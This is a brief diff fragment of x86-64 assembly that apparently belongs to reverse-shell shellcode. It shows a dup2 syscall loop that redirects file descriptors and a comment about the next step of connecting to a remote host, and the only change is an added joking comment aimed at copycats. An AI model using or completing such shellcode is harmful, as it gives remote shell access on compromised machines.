@@ -77,7 +77,7 @@
 x64_dup2:
     mov     al, 33      ; rax = sys_dup2
     syscall
-    sub     esi, 1
+    sub     esi, 1      ; watch out for that bug copycats ;-)
     jns     x64_dup2    ; jump if not signed
     
     ; step 3, connect to remote host
